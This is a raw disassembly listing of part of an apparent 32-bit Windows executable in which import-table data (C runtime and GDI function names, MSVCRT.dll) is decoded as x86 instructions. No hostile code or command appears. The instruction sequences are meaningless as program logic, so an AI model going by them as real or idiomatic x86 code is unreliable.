  412625:	sub    al,0x1
  412627:	add    ah,al
  412629:	sub    al,0x1
  41262b:	add    dl,dl
  41262d:	sub    al,0x1
  41262f:	add    ah,ah
  412631:	sub    al,0x1
  412633:	add    al,dh
  412635:	sub    al,0x1
  412637:	add    BYTE PTR [esi],al
  412639:	sub    eax,0x2d140001
  41263e:	add    DWORD PTR [eax],eax
  412640:	and    ch,BYTE PTR ds:0x2d300001
  412646:	add    DWORD PTR [eax],eax
  412648:	dec    edx
  412649:	sub    eax,0x2d5e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	push   0x2d
  412652:	add    DWORD PTR [eax],eax
  412654:	jp     0x412683
  412656:	add    DWORD PTR [eax],eax
  412658:	xchg   esi,eax
  412659:	sub    eax,0x2da60001
  41265e:	add    DWORD PTR [eax],eax
  412660:	mov    dh,0x2d
  412662:	add    DWORD PTR [eax],eax
  412664:	(bad)  
  412665:	sub    eax,0x2dd20001
  41266a:	add    DWORD PTR [eax],eax
  41266c:	loop   0x41269b
  41266e:	add    DWORD PTR [eax],eax
  412670:	hlt    
  412671:	sub    eax,0x2dfe0001
  412676:	add    DWORD PTR [eax],eax
  412678:	push   cs
  412679:	add    DWORD PTR cs:[eax],eax
  41267c:	push   ds
  41267d:	add    DWORD PTR cs:[eax],eax
  412680:	sub    BYTE PTR [esi],ch
  412682:	add    DWORD PTR [eax],eax
  412684:	add    BYTE PTR [eax],al
  412686:	add    BYTE PTR [eax],al
  412688:	dec    edx
  412689:	add    DWORD PTR cs:[eax],eax
  41268c:	add    BYTE PTR [eax],al
  41268e:	add    BYTE PTR [eax],al
  412690:	push   0x8000012e
  412695:	add    DWORD PTR cs:[eax],eax
  412698:	mov    WORD PTR [esi],gs
  41269a:	add    DWORD PTR [eax],eax
  41269c:	call   0x12e:0xb200012e
  4126a3:	add    dh,al
  4126a5:	add    DWORD PTR cs:[eax],eax
  4126a8:	fsubr  QWORD PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0xf84127df
  4126b1:	add    DWORD PTR cs:[eax],eax
  4126b4:	adc    BYTE PTR [edi],ch
  4126b6:	add    DWORD PTR [eax],eax
  4126b8:	push   ds
  4126b9:	das    
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	xor    BYTE PTR [edi],ch
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	inc    eax
  4126c1:	das    
  4126c2:	add    DWORD PTR [eax],eax
  4126c4:	push   esi
  4126c5:	das    
  4126c6:	add    DWORD PTR [eax],eax
  4126c8:	data16 das 
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	jbe    0x4126fd
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	mov    ch,BYTE PTR [edi]
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	xchg   esi,eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	mov    dl,0x2f
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	enter  0x12f,0x0
  4126e4:	loopne 0x412715
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	hlt    
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	add    dh,BYTE PTR [eax]
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	sbb    BYTE PTR [eax],dh
  4126f2:	add    DWORD PTR [eax],eax
  4126f4:	xor    BYTE PTR cs:[ecx],al
  4126f7:	add    BYTE PTR [edx],bh
  4126f9:	xor    BYTE PTR [ecx],al
  4126fb:	add    BYTE PTR [eax+0x30],cl
  4126fe:	add    DWORD PTR [eax],eax
  412700:	push   edx
  412701:	xor    BYTE PTR [ecx],al
  412703:	add    BYTE PTR [esi+0x30],ah
  412706:	add    DWORD PTR [eax],eax
  412708:	jbe    0x41273a
  41270a:	add    DWORD PTR [eax],eax
  41270c:	mov    dh,BYTE PTR [eax]
  41270e:	add    DWORD PTR [eax],eax
  412710:	pushf  
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax-0x3bfffed0],dh
  412719:	xor    BYTE PTR [ecx],al
  41271b:	add    ah,dl
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    dl,ch
  412721:	xor    BYTE PTR [ecx],al
  412723:	add    BYTE PTR [edx],al
  412725:	xor    DWORD PTR [ecx],eax
  412727:	add    BYTE PTR [edx],bl
  412729:	xor    DWORD PTR [ecx],eax
  41272b:	add    BYTE PTR [esi],ah
  41272d:	xor    DWORD PTR [ecx],eax
  41272f:	add    BYTE PTR [eax],bh
  412731:	xor    DWORD PTR [ecx],eax
  412733:	add    BYTE PTR [edx+0x31],cl
  412736:	add    DWORD PTR [eax],eax
  412738:	push   esi
  412739:	xor    DWORD PTR [ecx],eax
  41273b:	add    BYTE PTR [eax+0x31],ch
  41273e:	add    DWORD PTR [eax],eax
  412740:	jbe    0x412773
  412742:	add    DWORD PTR [eax],eax
  412744:	xor    BYTE PTR [ecx],0x1
  412747:	add    BYTE PTR [esi-0x59fffecf],dl
  41274d:	xor    DWORD PTR [ecx],eax
  41274f:	add    BYTE PTR [eax-0x2dfffecf],bh
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    dl,ch
  412759:	xor    DWORD PTR [ecx],eax
  41275b:	add    BYTE PTR [eax],al
  41275d:	add    BYTE PTR [eax],al
  41275f:	add    BYTE PTR [esi],al
  412761:	xor    al,BYTE PTR [ecx]
  412763:	add    BYTE PTR [edx+esi*1],bl
  412766:	add    DWORD PTR [eax],eax
  412768:	xor    dh,BYTE PTR [edx]
  41276a:	add    DWORD PTR [eax],eax
  41276c:	inc    edx
  41276d:	xor    al,BYTE PTR [ecx]
  41276f:	add    BYTE PTR [edx+0x32],dl
  412772:	add    DWORD PTR [eax],eax
  412774:	pusha  
  412775:	xor    al,BYTE PTR [ecx]
  412777:	add    BYTE PTR [eax+0x32],dh
  41277a:	add    DWORD PTR [eax],eax
  41277c:	test   BYTE PTR [edx],dh
  41277e:	add    DWORD PTR [eax],eax
  412780:	xchg   esp,eax
  412781:	xor    al,BYTE PTR [ecx]
  412783:	add    BYTE PTR [eax-0x41fffece],ch
  412789:	xor    al,BYTE PTR [ecx]
  41278b:	add    ah,cl
  41278d:	xor    al,BYTE PTR [ecx]
  41278f:	add    al,ah
  412791:	xor    al,BYTE PTR [ecx]
  412793:	add    al,dh
  412795:	xor    al,BYTE PTR [ecx]
  412797:	add    BYTE PTR [edx],al
  412799:	xor    eax,DWORD PTR [ecx]
  41279b:	add    BYTE PTR [edx],bl
  41279d:	xor    eax,DWORD PTR [ecx]
  41279f:	add    BYTE PTR [esi],ah
  4127a1:	xor    eax,DWORD PTR [ecx]
  4127a3:	add    BYTE PTR [ebx+esi*1],dh
  4127a6:	add    DWORD PTR [eax],eax
  4127a8:	inc    esp
  4127a9:	xor    eax,DWORD PTR [ecx]
  4127ab:	add    BYTE PTR [edx+0x33],dl
  4127ae:	add    DWORD PTR [eax],eax
  4127b0:	push   0x7a000133
  4127b5:	xor    eax,DWORD PTR [ecx]
  4127b7:	add    BYTE PTR [esi-0x6bfffecd],al
  4127bd:	xor    eax,DWORD PTR [ecx]
  4127bf:	add    BYTE PTR [esi-0x4bfffecd],ah
  4127c5:	xor    eax,DWORD PTR [ecx]
  4127c7:	add    dh,al
  4127c9:	xor    eax,DWORD PTR [ecx]
  4127cb:	add    al,bl
  4127cd:	xor    eax,DWORD PTR [ecx]
  4127cf:	add    dl,ch
  4127d1:	xor    eax,DWORD PTR [ecx]
  4127d3:	add    dl,bh
  4127d5:	xor    eax,DWORD PTR [ecx]
  4127d7:	add    BYTE PTR [esi],al
  4127d9:	xor    al,0x1
  4127db:	add    BYTE PTR [esp+esi*1],bl
  4127de:	add    DWORD PTR [eax],eax
  4127e0:	cmp    BYTE PTR [ecx+eax*1],dh
  4127e3:	add    BYTE PTR [edx+0x34],dl
  4127e6:	add    DWORD PTR [eax],eax
  4127e8:	data16 xor al,0x1
  4127eb:	add    BYTE PTR [esp+esi*1+0x1],dh
  4127ef:	add    BYTE PTR [eax-0x6dfffecc],al
  4127f5:	xor    al,0x1
  4127f7:	add    BYTE PTR [edx-0x51fffecc],ah
  4127fd:	xor    al,0x1
  4127ff:	add    BYTE PTR [edx-0x37fffecc],bh
  412805:	xor    al,0x1
  412807:	add    al,ah
  412809:	xor    al,0x1
  41280b:	add    al,dh
  41280d:	xor    al,0x1
  41280f:	add    BYTE PTR [eax],cl
  412811:	xor    eax,0x351a0001
  412816:	add    DWORD PTR [eax],eax
  412818:	sub    dh,BYTE PTR ds:0x35380001
  41281e:	add    DWORD PTR [eax],eax
  412820:	dec    edx
  412821:	xor    eax,0x35580001
  412826:	add    DWORD PTR [eax],eax
  412828:	fs xor eax,0x35720001
  41282e:	add    DWORD PTR [eax],eax
  412830:	jl     0x412867
  412832:	add    DWORD PTR [eax],eax
  412834:	xchg   esp,eax
  412835:	xor    eax,0x35a40001
  41283a:	add    DWORD PTR [eax],eax
  41283c:	mov    ah,0x35
  41283e:	add    DWORD PTR [eax],eax
  412840:	ret    0x135
  412843:	add    al,dl
  412845:	xor    eax,0x35e00001
  41284a:	add    DWORD PTR [eax],eax
  41284c:	div    BYTE PTR ds:0x36080001
  412852:	add    DWORD PTR [eax],eax
  412854:	push   ss
  412855:	add    DWORD PTR ss:[eax],eax
  412858:	sub    al,0x36
  41285a:	add    DWORD PTR [eax],eax
  41285c:	cmp    dh,BYTE PTR [esi]
  41285e:	add    DWORD PTR [eax],eax
  412860:	push   edx
  412861:	add    DWORD PTR ss:[eax],eax
  412864:	pop    esi
  412865:	add    DWORD PTR ss:[eax],eax
  412868:	push   0x36
  41286a:	add    DWORD PTR [eax],eax
  41286c:	jbe    0x4128a4
  41286e:	add    DWORD PTR [eax],eax
  412870:	test   BYTE PTR [esi],dh
  412872:	add    DWORD PTR [eax],eax
  412874:	xchg   esi,eax
  412875:	add    DWORD PTR ss:[eax],eax
  412878:	mov    ds:0xb4000136,al
  41287d:	add    DWORD PTR ss:[eax],eax
  412880:	shl    BYTE PTR [esi],0x1
  412883:	add    dh,cl
  412885:	add    DWORD PTR ss:[eax],eax
  412888:	fdiv   QWORD PTR [esi]
  41288a:	add    DWORD PTR [eax],eax
  41288c:	call   0xf64129c7
  412891:	add    DWORD PTR ss:[eax],eax
  412894:	add    al,0x37
  412896:	add    DWORD PTR [eax],eax
  412898:	adc    al,0x37
  41289a:	add    DWORD PTR [eax],eax
  41289c:	es aaa 
  41289e:	add    DWORD PTR [eax],eax
  4128a0:	cmp    al,0x37
  4128a2:	add    DWORD PTR [eax],eax
  4128a4:	inc    esi
  4128a5:	aaa    
  4128a6:	add    DWORD PTR [eax],eax
  4128a8:	push   esp
  4128a9:	aaa    
  4128aa:	add    DWORD PTR [eax],eax
  4128ac:	fs aaa 
  4128ae:	add    DWORD PTR [eax],eax
  4128b0:	jbe    0x4128e9
  4128b2:	add    DWORD PTR [eax],eax
  4128b4:	test   BYTE PTR [edi],dh
  4128b6:	add    DWORD PTR [eax],eax
  4128b8:	cwde   
  4128b9:	aaa    
  4128ba:	add    DWORD PTR [eax],eax
  4128bc:	mov    dl,0x37
  4128be:	add    DWORD PTR [eax],eax
  4128c0:	les    esi,FWORD PTR [edi]
  4128c2:	add    DWORD PTR [eax],eax
  4128c4:	aam    0x37
  4128c6:	add    DWORD PTR [eax],eax
  4128c8:	call   0xfa412a04
  4128cd:	aaa    
  4128ce:	add    DWORD PTR [eax],eax
  4128d0:	or     bh,BYTE PTR [eax]
  4128d2:	add    DWORD PTR [eax],eax
  4128d4:	push   ss
  4128d5:	cmp    BYTE PTR [ecx],al
  4128d7:	add    BYTE PTR [eax+edi*1],dh
  4128da:	add    DWORD PTR [eax],eax
  4128dc:	inc    esi
  4128dd:	cmp    BYTE PTR [ecx],al
  4128df:	add    BYTE PTR [eax+edi*1+0x1],bl
  4128e3:	add    BYTE PTR [eax+0x38],bh
  4128e6:	add    DWORD PTR [eax],eax
  4128e8:	nop
  4128e9:	cmp    BYTE PTR [ecx],al
  4128eb:	add    BYTE PTR [eax+edi*1+0x38b00001],bl
  4128f2:	add    DWORD PTR [eax],eax
  4128f4:	mov    edx,0xc8000138
  4128f9:	cmp    BYTE PTR [ecx],al
  4128fb:	add    ah,ah
  4128fd:	cmp    BYTE PTR [ecx],al
  4128ff:	add    dl,dh
  412901:	cmp    BYTE PTR [ecx],al
  412903:	add    BYTE PTR [esi],al
  412905:	cmp    DWORD PTR [ecx],eax
  412907:	add    BYTE PTR [eax],bl
  412909:	cmp    DWORD PTR [ecx],eax
  41290b:	add    BYTE PTR [edx],ch
  41290d:	cmp    DWORD PTR [ecx],eax
  41290f:	add    BYTE PTR [edx],bh
  412911:	cmp    DWORD PTR [ecx],eax
  412913:	add    BYTE PTR [eax+0x39],dl
  412916:	add    DWORD PTR [eax],eax
  412918:	cmp    WORD PTR [ecx],ax
  41291b:	add    BYTE PTR [eax],al
  41291d:	add    BYTE PTR [eax],al
  41291f:	add    al,ch
  412921:	add    esi,DWORD PTR [ebx+0x74]
  412924:	jb     0x412989
  412926:	jo     0x4129a1
  412928:	add    BYTE PTR [eax],al
  41292a:	or     eax,0x676e7504
  41292f:	gs je  0x412995
  412932:	add    BYTE PTR [eax],al
  412934:	pop    edi
  412935:	add    esp,DWORD PTR [ebx+0x6c]
  412938:	gs popa 
  41293a:	jb     0x4129a1
  41293c:	jb     0x4129b0
  41293e:	add    BYTE PTR [eax],al
  412940:	sub    BYTE PTR [edi+esi*2],al
  412943:	arpl   WORD PTR [ebx+0x6e],si
  412946:	arpl   WORD PTR [ebp+0x70],bp
  412949:	add    ch,dh
  41294b:	add    BYTE PTR [edi+0x63],bl
  41294e:	outs   dx,DWORD PTR ds:[esi]
  41294f:	outs   dx,BYTE PTR ds:[esi]
  412950:	je     0x4129c4
  412952:	outs   dx,DWORD PTR ds:[esi]
  412953:	ins    BYTE PTR es:[edi],dx
  412954:	data16 jo 0x412957
  412957:	add    BYTE PTR [ebp+0x6c616d03],dh
  41295d:	ins    BYTE PTR es:[edi],dx
  41295e:	outs   dx,DWORD PTR ds:[esi]
  41295f:	arpl   WORD PTR [eax],ax
  412961:	add    BYTE PTR [ebx+0x735f5f00],dh
  412967:	gs je  0x4129c9
  41296a:	popa   
  41296b:	jo     0x4129dd
  41296d:	pop    edi
  41296e:	je     0x4129e9
  412970:	jo     0x4129d7
  412972:	add    BYTE PTR [eax],al
  412974:	add    eax,DWORD PTR [ebx+esi*2]
  412977:	jns    0x4129ec
  412979:	je     0x4129e0
  41297b:	ins    DWORD PTR es:[edi],dx
  41297c:	add    BYTE PTR [eax],al
  41297e:	mov    al,ds:0x705f5f00
  412983:	pop    edi
  412984:	pop    edi
  412985:	ins    WORD PTR es:[edi],dx
  412987:	outs   dx,DWORD PTR ds:[esi]
  412988:	fs add BYTE PTR gs:[eax],al
  41298c:	pop    ebp
  41298d:	add    esp,DWORD PTR [ebx+0x61]
  412990:	ins    BYTE PTR es:[edi],dx
  412991:	ins    BYTE PTR es:[edi],dx
  412992:	outs   dx,DWORD PTR ds:[esi]
  412993:	arpl   WORD PTR [eax],ax
  412995:	add    BYTE PTR [ebx+0x705f5f00],bl
  41299b:	pop    edi
  41299c:	pop    edi
  41299d:	arpl   WORD PTR [edi+0x6d],bp
  4129a0:	ins    DWORD PTR es:[edi],dx
  4129a1:	outs   dx,DWORD PTR ds:[esi]
  4129a2:	fs add BYTE PTR gs:[eax],al
  4129a6:	std    
  4129a7:	add    esi,DWORD PTR [ebx+0x74]
  4129aa:	jb     0x412a20
  4129ac:	outs   dx,DWORD PTR ds:[esi]
  4129ad:	jne    0x412a1b
  4129af:	add    BYTE PTR [esi],dl
  4129b1:	add    al,0x76
  4129b3:	jae    0x412a25
  4129b5:	jb     0x412a20
  4129b7:	outs   dx,BYTE PTR ds:[esi]
  4129b8:	je     0x412a20
  4129ba:	add    BYTE PTR [eax],al
  4129bc:	sub    al,0x4
  4129be:	ja     0x412a23
  4129c0:	jae    0x412a32
  4129c2:	bound  esi,QWORD PTR [edx+0x6b]
  4129c5:	add    bl,bl
  4129c7:	add    BYTE PTR [edi+0x61],bl
  4129ca:	ins    DWORD PTR es:[edi],dx
  4129cb:	jae    0x412a34
  4129cd:	pop    edi
  4129ce:	gs js  0x412a3a
  4129d1:	je     0x4129d3
  4129d3:	add    BYTE PTR [esi+0x6e695f01],al
  4129d9:	imul   esi,DWORD PTR [esp+esi*2+0x65],0x94006d72
  4129e1:	add    ebp,DWORD PTR [ecx+0x73]
  4129e4:	popa   
  4129e5:	ins    BYTE PTR es:[edi],dx
  4129e6:	outs   dx,BYTE PTR ds:[esi]
  4129e7:	jne    0x412a56
  4129e9:	add    BYTE PTR [ebp+0x3],ch
  4129ec:	data16 addr16 gs je 0x412a54
  4129f1:	add    BYTE PTR [esi+0x73695f01],bl
  4129f7:	ins    DWORD PTR es:[edi],dx
  4129f8:	bound  esp,QWORD PTR [edx+0x6c]
  4129fb:	gs popa 
  4129fd:	add    BYTE PTR fs:[eax],al
  412a00:	pop    ebx
  412a01:	add    esp,DWORD PTR [edx+0x73]
  412a04:	gs popa 
  412a06:	jb     0x412a6b
  412a08:	push   0x7303e500
  412a0d:	je     0x412a81
  412a0f:	arpl   WORD PTR [eax+0x72],bp
  412a12:	add    BYTE PTR [eax],al
  412a14:	push   edx
  412a15:	add    BYTE PTR [edi+0x58],bl
  412a18:	arpl   WORD PTR [eax+0x74],si
  412a1b:	inc    esi
  412a1c:	imul   ebp,DWORD PTR [esp+esi*2+0x65],0x3e70072
  412a24:	jae    0x412a9a
  412a26:	jb     0x412a8b
  412a28:	outs   dx,DWORD PTR ds:[esi]
  412a29:	ins    BYTE PTR es:[edi],dx
  412a2a:	ins    BYTE PTR es:[edi],dx
  412a2b:	add    BYTE PTR [esi],al
  412a2d:	add    al,0x74
  412a2f:	imul   ebp,DWORD PTR [ebp+0x65],0x3b10000
  412a36:	ins    BYTE PTR es:[edi],dx
  412a37:	outs   dx,DWORD PTR ds:[esi]
  412a38:	arpl   WORD PTR [ecx+0x6c],sp
  412a3b:	je     0x412aa6
  412a3d:	ins    DWORD PTR es:[edi],dx
  412a3e:	add    BYTE PTR gs:[eax],bh
  412a41:	add    al,0x77
  412a43:	arpl   WORD PTR [ebx+0x74],si
  412a46:	outs   dx,DWORD PTR ds:[esi]
  412a47:	jne    0x412ab5
  412a49:	add    BYTE PTR [ecx],ah
  412a4b:	add    al,0x77
  412a4d:	arpl   WORD PTR [ebx+0x63],si
  412a50:	jo     0x412acb
  412a52:	add    BYTE PTR [eax],al
  412a54:	enter  0x7003,0x75
  412a58:	je     0x412abd
  412a5a:	push   0x78007261
  412a5f:	add    esp,DWORD PTR [esi+0x70]
  412a62:	jne    0x412ad8
  412a64:	arpl   WORD PTR [eax],ax
  412a66:	sbb    al,0x4
  412a68:	ja     0x412acd
  412a6a:	jae    0x412acf
  412a6c:	popa   
  412a6d:	je     0x412a6f
  412a6f:	add    dl,ch
  412a71:	add    esi,DWORD PTR [ebx+0x74]
  412a74:	jb     0x412ad9
  412a76:	jae    0x412ae8
  412a78:	outs   dx,BYTE PTR ds:[esi]
  412a79:	add    BYTE PTR [ebx+0x65736603],al
  412a7f:	imul   eax,DWORD PTR gs:[eax],0xffffffb7
  412a83:	add    ebp,DWORD PTR [ebp+0x62]
  412a86:	jae    0x412afc
  412a88:	outs   dx,DWORD PTR ds:[esi]
  412a89:	ja     0x412aee
  412a8b:	jae    0x412a8d
  412a8d:	add    BYTE PTR [ebx],cl
  412a8f:	add    al,0x74
  412a91:	outs   dx,DWORD PTR ds:[esi]
  412a92:	ja     0x412b00
  412a94:	outs   dx,DWORD PTR ds:[esi]
  412a95:	ja     0x412afc
  412a97:	jb     0x412a99
  412a99:	add    ah,cl
  412a9b:	add    esi,DWORD PTR [ecx+0x73]
  412a9e:	outs   dx,DWORD PTR ds:[esi]
  412a9f:	jb     0x412b15
  412aa1:	add    BYTE PTR [ecx],al
  412aa3:	add    al,0x73
  412aa5:	ja     0x412b1a
  412aa7:	arpl   WORD PTR [ecx+0x6e],sp
  412aaa:	data16 add BYTE PTR [ebx],ah
  412aad:	add    DWORD PTR [edi+0x65],ebx
  412ab0:	js     0x412b1b
  412ab2:	je     0x412ab4
  412ab4:	ss add al,0x77
  412ab7:	arpl   WORD PTR [ebx+0x74],si
  412aba:	outs   dx,DWORD PTR ds:[esi]
  412abb:	ins    DWORD PTR es:[edi],dx
  412abc:	bound  esi,QWORD PTR [ebx+0x0]
  412abf:	add    al,ch
  412ac1:	add    BYTE PTR [edi+0x63],bl
  412ac4:	gs js  0x412b30
  412ac7:	je     0x412ac9
  412ac9:	add    BYTE PTR [ecx],ch
  412acb:	add    al,0x77
  412acd:	arpl   WORD PTR [ebx+0x6e],si
  412ad0:	arpl   WORD PTR [eax+0x79],si
  412ad3:	add    BYTE PTR [ebx+0x70736903],bl
  412ad9:	jb     0x412b44
  412adb:	outs   dx,BYTE PTR ds:[esi]
  412adc:	je     0x412ade
  412ade:	mov    ch,0x0
  412ae0:	pop    edi
  412ae1:	pop    edi
  412ae2:	jae    0x412b49
  412ae4:	je     0x412b5b
  412ae6:	jae    0x412b4d
  412ae8:	jb     0x412b57
  412aea:	popa   
  412aeb:	je     0x412b55
  412aed:	gs jb  0x412b62
  412af0:	add    BYTE PTR [eax],al
  412af2:	sbb    BYTE PTR [esi+esi*2],al
  412af5:	jae    0x412b6e
  412af7:	jo     0x412b6b
  412af9:	imul   ebp,DWORD PTR [esi+0x74],0x720066
  412b00:	pop    edi
  412b01:	pop    edi
  412b02:	addr16 gs je 0x412b73
  412b06:	popa   
  412b07:	imul   ebp,DWORD PTR [esi+0x61],0x736772
  412b0e:	dec    ebp
  412b0f:	push   ebx
  412b10:	push   esi
  412b11:	inc    ebx
  412b12:	push   edx
  412b13:	push   esp
  412b14:	cs fs ins BYTE PTR es:[edi],dx
  412b17:	ins    BYTE PTR es:[edi],dx
  412b18:	add    BYTE PTR [eax],al
  412b1a:	fadd   QWORD PTR [ecx]
  412b1c:	push   ebx
  412b1d:	gs je  0x412b64
  412b20:	dec    ecx
  412b21:	inc    edx
  412b22:	inc    ebx
  412b23:	outs   dx,DWORD PTR ds:[esi]
  412b24:	ins    BYTE PTR es:[edi],dx
  412b25:	outs   dx,DWORD PTR ds:[esi]
  412b26:	jb     0x412b7c
  412b28:	popa   
  412b29:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  412b2d:	add    bh,dl
  412b2f:	add    DWORD PTR [ebx+0x65],edx
  412b32:	je     0x412b76
  412b34:	jb     0x412bab
  412b36:	jae    0x412ba0
  412b38:	dec    edi
  412b39:	jb     0x412ba2
  412b3b:	inc    ebp
  412b3c:	js     0x412b3e
  412b3e:	add    DWORD PTR [eax],0x626d6f43
  412b44:	imul   ebp,DWORD PTR [esi+0x65],0x6e6752
  412b4b:	add    BYTE PTR [ecx+eax*1],ah
  412b4e:	inc    edi
  412b4f:	gs je  0x412b94
  412b52:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  412b56:	gs add bh,cl
  412b59:	add    DWORD PTR [ebx+0x65],edx
  412b5c:	ins    BYTE PTR es:[edi],dx
  412b5d:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  412b62:	ins    BYTE PTR es:[edi],dx
  412b63:	gs je  0x412bda
  412b66:	add    BYTE PTR gs:[ecx+0x65724300],cl
  412b6d:	popa   
  412b6e:	je     0x412bd5
  412b70:	inc    edx
  412b71:	jb     0x412be8
  412b73:	jae    0x412bdd
  412b75:	dec    ecx
  412b76:	outs   dx,BYTE PTR ds:[esi]
  412b77:	imul   esi,DWORD PTR fs:[edx+0x65],0xaa007463
  412b7f:	add    BYTE PTR [ebx+0x72],al
  412b82:	gs popa 
  412b84:	je     0x412beb
  412b86:	push   eax
  412b87:	outs   dx,DWORD PTR ds:[esi]
  412b88:	ins    BYTE PTR es:[edi],dx
  412b89:	jns    0x412bf2
  412b8b:	outs   dx,DWORD PTR ds:[esi]
  412b8c:	outs   dx,BYTE PTR ds:[esi]
  412b8d:	push   edx
  412b8e:	outs   dx,BYTE PTR ds:[si]
  412b90:	add    BYTE PTR [eax],al
  412b92:	mov    al,ds:0x65724300
  412b97:	popa   
  412b98:	je     0x412bff
  412b9a:	dec    eax
  412b9b:	popa   
  412b9c:	je     0x412c01
  412b9e:	push   0x73757242
  412ba3:	push   0x17a0000
  412ba8:	inc    edi
  412ba9:	gs je  0x412bff
  412bac:	jns    0x412c21
  412bae:	je     0x412c15
  412bb0:	ins    DWORD PTR es:[edi],dx
  412bb1:	push   eax
  412bb2:	popa   
  412bb3:	ins    BYTE PTR es:[edi],dx
  412bb4:	gs je  0x412c2b
  412bb7:	gs push ebp
  412bb9:	jae    0x412c20
  412bbb:	add    BYTE PTR [esi+0x65724300],bl
  412bc1:	popa   
  412bc2:	je     0x412c29
  412bc4:	inc    esi
  412bc5:	outs   dx,DWORD PTR ds:[esi]
  412bc6:	outs   dx,BYTE PTR ds:[esi]
  412bc7:	je     0x412c20
  412bc9:	add    BYTE PTR [ebp+0x65724300],bl
  412bcf:	popa   
  412bd0:	je     0x412c37
  412bd2:	inc    esi
  412bd3:	outs   dx,DWORD PTR ds:[esi]
  412bd4:	outs   dx,BYTE PTR ds:[esi]
  412bd5:	je     0x412c20
  412bd7:	outs   dx,BYTE PTR ds:[esi]
  412bd8:	imul   esi,DWORD PTR fs:[edx+0x65],0x577463
  412be0:	mov    ah,0x1
  412be2:	push   eax
  412be3:	outs   dx,DWORD PTR ds:[esi]
  412be4:	ins    BYTE PTR es:[edi],dx
  412be5:	jns    0x412c53
  412be7:	imul   ebp,DWORD PTR [esi+0x65],0x18a0000
  412bee:	inc    edi
  412bef:	gs je  0x412c46
  412bf2:	gs js  0x412c69
  412bf5:	dec    ebp
  412bf6:	gs je  0x412c6b
  412bf9:	imul   esp,DWORD PTR [ebx+0x73],0x20d0041
  412c00:	push   esp
  412c01:	jb     0x412c64
  412c03:	outs   dx,BYTE PTR ds:[esi]
  412c04:	jae    0x412c72
  412c06:	popa   
  412c07:	je     0x412c6e
  412c09:	inc    ebx
  412c0a:	push   0x65737261
  412c0f:	je     0x412c5a
  412c11:	outs   dx,BYTE PTR ds:[esi]
  412c12:	outs   dx,WORD PTR ds:[esi]
  412c14:	add    BYTE PTR [eax],al
  412c16:	lar    edx,WORD PTR [ebp+0x6e]
  412c1a:	jb     0x412c81
  412c1c:	popa   
  412c1d:	ins    BYTE PTR es:[edi],dx
  412c1e:	imul   edi,DWORD PTR [edx+0x65],0x656a624f
  412c25:	arpl   WORD PTR [eax+eax*1+0x41],si
  412c29:	add    DWORD PTR [edi+0x65],eax
  412c2c:	je     0x412c72
  412c2e:	gs jbe 0x412c9a
  412c31:	arpl   WORD PTR [ebp+0x43],sp
  412c34:	popa   
  412c35:	jo     0x412caa
  412c37:	add    BYTE PTR [ecx+0x1],dh
  412c3a:	inc    edi
  412c3b:	gs je  0x412c90
  412c3e:	dec    edi
  412c3f:	push   eax
  412c40:	xor    al,BYTE PTR [eax]
  412c42:	les    eax,FWORD PTR [eax]
  412c44:	inc    ebp
  412c45:	outs   dx,BYTE PTR ds:[esi]
  412c46:	jne    0x412cb5
  412c48:	inc    esi
  412c49:	outs   dx,DWORD PTR ds:[esi]
  412c4a:	outs   dx,BYTE PTR ds:[esi]
  412c4b:	je     0x412c93
  412c4d:	popa   
  412c4e:	ins    DWORD PTR es:[edi],dx
  412c4f:	imul   ebp,DWORD PTR [ecx+ebp*2+0x65],0x57784573
  412c57:	add    BYTE PTR [eax+eax*1+0x61657243],dl
  412c5e:	je     0x412cc5
  412c60:	inc    esp
  412c61:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  412c68:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  412c6c:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x1dd0070
  412c74:	push   ebx
  412c75:	gs je  0x412cbc
  412c78:	dec    ecx
  412c79:	inc    edx
  412c7a:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x654400b3
  412c82:	ins    BYTE PTR es:[edi],dx
  412c83:	gs je  0x412ceb
  412c86:	inc    esp
  412c87:	inc    ebx
  412c88:	add    BYTE PTR [eax],al
  412c8a:	mov    es,WORD PTR [ecx]
  412c8c:	inc    edi
  412c8d:	gs je  0x412ce6
  412c90:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  412c97:	dec    edi
  412c98:	jb     0x412d01
  412c9a:	inc    ebp
  412c9b:	js     0x412c9d
  412c9d:	add    BYTE PTR [ecx+0x1],bh
  412ca0:	inc    edi
  412ca1:	gs je  0x412cf7
  412ca4:	jns    0x412d19
  412ca6:	je     0x412d0d
  412ca8:	ins    DWORD PTR es:[edi],dx
  412ca9:	push   eax
  412caa:	popa   
  412cab:	ins    BYTE PTR es:[edi],dx
  412cac:	gs je  0x412d23
  412caf:	gs inc ebp
  412cb1:	outs   dx,BYTE PTR ds:[esi]
  412cb2:	je     0x412d26
  412cb4:	imul   esp,DWORD PTR [ebp+0x73],0x57021400
  412cbb:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  412cc3:	add    BYTE PTR [edi+0x1],ah
  412cc6:	inc    edi
  412cc7:	gs je  0x412d19
  412cca:	bound  ebp,QWORD PTR [edx+0x65]
  412ccd:	arpl   WORD PTR [ecx+eax*2+0x0],si
  412cd1:	add    BYTE PTR [ebx+0x74654701],cl
  412cd7:	push   esp
  412cd8:	gs js  0x412d4f
  412cdb:	dec    ebp
